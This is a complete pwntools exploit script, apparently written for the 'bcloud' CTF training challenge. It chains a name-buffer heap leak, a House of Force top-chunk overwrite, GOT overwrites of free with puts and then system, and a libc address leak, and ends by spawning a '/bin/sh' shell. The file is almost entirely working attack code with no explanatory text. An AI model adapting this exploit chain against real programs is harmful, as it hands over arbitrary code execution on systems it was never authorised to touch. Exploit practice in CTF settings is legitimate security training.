import pwn
import ctypes

pwn.context.terminal = ['gnome-terminal', '-e']
pwn.context.arch = 'i386'

r = pwn.process('./bcloud', env={'LD_PRELOAD': './libc-2.27.so'})

# org_malloc_breakpoint = "0x08048920"
# org_heap_strcpy = "0x08048978"
# new_note_malloc = "0x08048a19"

# pwn.gdb.attach(r, f"""
#     b *{new_note_malloc}
#     c
# """)

# r = pwn.remote('training.jinblack.it', 2016)

input("wait")

ADDRESS_SIZE = 4

NAME_BUF_LEN = 64
ORG_BUF_LEN = 64
HOST_BUF_LEN = 64

def better_hex(value, padding=ADDRESS_SIZE * 2):
    return f"{value:#0{padding}x}"

def setup(name, org, host):
    r.recvuntil("Input your name:\n")
    r.send(name)
    r.recvuntil("Hey ")
    r.recv(NAME_BUF_LEN)
    leak = r.recvuntil("!")[:-1] # everything except last index
    r.recvuntil("Org:\n")
    r.send(org)
    r.recvuntil("Host:\n")
    r.send(host)
    r.recvuntil("OKay! Enjoy:)\n")
    if len(leak) < ADDRESS_SIZE:
        leak += b"\x00"
    return pwn.u32(leak)

def new_note(length, content):
    r.sendline("1")
    r.recvuntil("Input the length of the note content:\n")
    r.sendline(str(length))
    r.recvuntil("Input the content:\n")
    r.sendline(content)
    if r.recvuntil("Create success, the id is ", timeout=0.1) == '':
        print(r.recvall())
        raise Exception('NEW NOTE ERROR')
    return int(r.recv(1)) 

def edit_note(id_input, content):
    r.sendline("3")
    r.recvuntil("Input the id:\n")
    r.sendline(str(id_input))
    r.recvuntil("Input the new content:\n")
    r.sendline(content)
    if r.recvuntil("Edit success.\n", timeout=0.1) == '':
        print(r.recvall())
        raise Exception("EDIT NOTE ERROR")

def delete_note(id_input, leak_cb=None):
    r.sendline("4")
    r.recvuntil("Input the id:\n")
    r.sendline(str(id_input))
    if leak_cb:
        leak_cb(r.recvuntil("\n")[:-1])
    if r.recvuntil("Delete success.\n", timeout=0.1) == '':
        print(r.recvall())
        raise Exception("DELETE NOTE ERROR")

def size_to_move_top_chunk(top_chunk, target):
    EXTRA_NOTE_SIZE = 4
    return ctypes.c_int(ctypes.c_uint(target - top_chunk - EXTRA_NOTE_SIZE).value).value

org_buffer_to_top_chunk_size_offset = 0x4c

length_of_actual_payload_to_org_heap = ORG_BUF_LEN + ADDRESS_SIZE + HOST_BUF_LEN
org_heap_payload = bytearray(b"A" * ORG_BUF_LEN + b"\x00" * ADDRESS_SIZE + b"A" * HOST_BUF_LEN)

new_top_chunk_size = 0xffffffff
new_top_chunk_size_payload = pwn.p32(new_top_chunk_size)

org_heap_payload[org_buffer_to_top_chunk_size_offset : org_buffer_to_top_chunk_size_offset + ADDRESS_SIZE] = new_top_chunk_size_payload

name_payload = b"A" * NAME_BUF_LEN
org_payload = org_heap_payload[:ORG_BUF_LEN]
host_payload = b"\xff" * HOST_BUF_LEN # org_heap_payload[ORG_BUF_LEN + ADDRESS_SIZE : ORG_BUF_LEN + ADDRESS_SIZE + HOST_BUF_LEN]

print("org heap")
print(pwn.binascii.hexlify(org_heap_payload))

print("name:")
print(pwn.binascii.hexlify(name_payload))
print("org:")
print(pwn.binascii.hexlify(org_payload))
print("host:")
print(pwn.binascii.hexlify(host_payload))

name_addr = setup(name_payload, org_payload, host_payload)

offset_from_name_addr_to_top_chunk = 0xf8
 
top_chunk_addr = name_addr + offset_from_name_addr_to_top_chunk

print("------------------------")
print("name_addr:")
print(better_hex(name_addr))
print("top_chunk_addr:")
print(better_hex(top_chunk_addr))

puts_plt = 0x8048520
free_plt = 0x80484e0

notes_addr = 0x0804b120

chunk_start_to_buffer_start = 0x10

note_size = size_to_move_top_chunk(top_chunk_addr, notes_addr - chunk_start_to_buffer_start)
print("note_size")
print(better_hex(note_size))

# note 0
new_note(note_size, "")

print("set new top_chunk")


OFFSET_TO_MOVE_HEAP = 50 # move next chunks location so it does not mess with global_notes

# note 1
address_note_id = new_note(OFFSET_TO_MOVE_HEAP, b"A" * ADDRESS_SIZE + pwn.p32(notes_addr + ADDRESS_SIZE * 2))

print("created address_note. Id:")
print(address_note_id)

content_note_id = new_note(4, "")

print("created content note. Id:")
print(content_note_id)

leaker_note_id = new_note(4, "")
print("created leaker note. Id:")
print(leaker_note_id)

leaker_note_addr = notes_addr + ADDRESS_SIZE * leaker_note_id


def arbitrary_write(address, content):
    edit_note(address_note_id, address)
    edit_note(content_note_id, content)

free_got = 0x804b014
puts_got = 0x804b024

arbitrary_write(pwn.p32(free_got), pwn.p32(puts_plt))
arbitrary_write(pwn.p32(leaker_note_addr), pwn.p32(puts_got))

puts_libc_leak = ""

def leak_puts(leak):
    global puts_libc_leak
    puts_libc_leak = pwn.u32(leak[:4])


puts_once = 0xf7debb40
system_once = 0xf7dc1200
system_offset = system_once - puts_once

delete_note(leaker_note_id, leak_puts)

system_leak = puts_libc_leak + system_offset

print("Puts:")
print(hex(puts_libc_leak))
print("System:")
print(hex(system_leak))

arbitrary_write(pwn.p32(free_got), pwn.p32(system_leak))
sh_str = "/bin/sh\x00"
sh_note_id = new_note(len(sh_str), sh_str)
delete_note(sh_note_id)

r.interactive()